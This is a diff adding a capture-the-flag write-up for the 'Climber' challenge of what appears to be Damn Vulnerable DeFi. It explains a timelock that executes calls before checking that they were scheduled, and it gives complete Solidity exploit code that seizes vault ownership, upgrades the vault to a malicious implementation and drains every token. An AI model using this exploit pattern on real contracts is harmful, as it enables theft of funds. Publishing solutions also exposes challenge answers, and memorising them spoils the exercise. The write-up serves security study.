@@ -986,3 +986,157 @@ Attack flow:
         );
         attacker.attack();
     }
+
+## 12. Cliber   
+
+### Chalange Overview   
+
+There’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the [UUPS pattern](https://eips.ethereum.org/EIPS/eip-1822).    
+The owner of the vault is a timelock contract. It can withdraw a limited amount of tokens every 15 days.    
+On the vault there’s an additional role with powers to sweep all tokens in case of an emergency.    
+On the timelock, only an account with a “Proposer” role can schedule actions that can be executed 1 hour later. 
+You must rescue all tokens from the vault and deposit them into the designated recovery account.    
+
+### Vulnerability Analysis  
+
+The Climber challenge exposes a critical vulnerability in the execution flow of the ClimberTimelock contract. The timelock controls access to a secure vault with 10 million DVT tokens, and the vulnerability allows an attacker to bypass the timelock delay mechanism completely.
+The core vulnerability lies in the execute() function within the ClimberTimelock contract:
+solidityfunction execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
+    external
+    payable
+{
+    if (targets.length <= MIN_TARGETS) {
+        revert InvalidTargetsCount();
+    }
+
+    // ... other validation ...
+
+    bytes32 id = getOperationId(targets, values, dataElements, salt);
+
+    for (uint8 i = 0; i < targets.length; ++i) {
+        targets[i].functionCallWithValue(dataElements[i], values[i]);
+    }
+
+    if (getOperationState(id) != OperationState.ReadyForExecution) {
+        revert NotReadyForExecution(id);
+    }
+
+    operations[id].executed = true;
+}
+This implementation is vulnerable because it executes all function calls before validating if the operation was properly scheduled and ready for execution. This "execute first, validate later" pattern creates a critical race condition where an attacker can manipulate the contract's state during execution to make the validation check pass.    
+
+Attack flow:    
+
+1. Construct a malicious operation that includes multiple function calls:   
+    - Grant PROPOSER_ROLE to the attacker's contract    
+    - Set the timelock delay to 0   
+    - Transfer ownership of the vault to the attacker's contract    
+    - Schedule this same operation through the attacker's contract  
+2. Call the timelock's execute() function with these operations 
+3. After gaining ownership of the vault, deploy a malicious implementation contract 
+4. Upgrade the vault implementation using the UUPS pattern  
+5. Call a custom function in the new implementation to drain all tokens 
+
+### Solution    
+
+    contract Attacker {
+        
+        ClimberVault vault;
+        ClimberTimelock timelock;
+        DamnValuableToken token;
+        address recovery;
+        address[] targets = new address[](4);
+        uint256[] values = new uint256[](4);
+        bytes[] dataElements = new bytes[](4);
+
+        constructor(
+            ClimberVault _vault,
+            ClimberTimelock _timelock,
+            DamnValuableToken _token,
+            address _recovery
+        ) {
+            vault = _vault;
+            timelock = _timelock;
+            token = _token;
+            recovery = _recovery;
+        }
+
+        function attack() external {
+            
+            address maliciousImpl = address(new MaliciousVault());
+
+            bytes memory grantRoleData = abi.encodeWithSignature(
+                "grantRole(bytes32,address)",
+                keccak256("PROPOSER_ROLE"),
+                address(this)
+            );
+
+            bytes memory changeDelayData = abi.encodeWithSignature(
+                "updateDelay(uint64)",
+                uint64(0)
+            );
+
+            bytes memory transferOwnershipData = abi.encodeWithSignature(
+                "transferOwnership(address)",
+                address(this)
+            );
+
+            bytes memory scheduleData = abi.encodeWithSignature(
+                "timelockSchedule()"
+            );
+        
+            targets[0] = address(timelock);
+            values[0] = 0;
+            dataElements[0] = grantRoleData;
+
+            targets[1] = address(timelock);
+            values[1] = 0;
+            dataElements[1] = changeDelayData;
+
+            targets[2] = address(vault);
+            values[2] = 0;
+            dataElements[2] = transferOwnershipData;
+
+            targets[3] = address(this);
+            values[3] = 0;
+            dataElements[3] = scheduleData;
+
+            timelock.execute(
+                targets,
+                values,
+                dataElements,
+                bytes32(0)
+            );
+
+            vault.upgradeToAndCall(address(maliciousImpl), "");
+            MaliciousVault(address(vault)).drainFunds(address(token), recovery);
+        }
+
+        function timelockSchedule() external {
+            timelock.schedule(targets, values, dataElements, bytes32(0));
+        }
+    }
+
+    contract MaliciousVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
+        uint256 private _lastWithdrawalTimestamp;
+        address private _sweeper;
+
+        /// @custom:oz-upgrades-unsafe-allow constructor
+        constructor() {
+            _disableInitializers();
+        }
+
+        function drainFunds(address token, address receiver) external {
+            SafeTransferLib.safeTransfer(token, receiver, IERC20(token).balanceOf(address(this)));
+        }
+
+        function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
+    }
+
+    /**
+     * CODE YOUR SOLUTION HERE
+     */
+    function test_climber() public checkSolvedByPlayer {
+        Attacker attacker = new Attacker(vault, timelock, token, recovery);
+        attacker.attack();
+    }
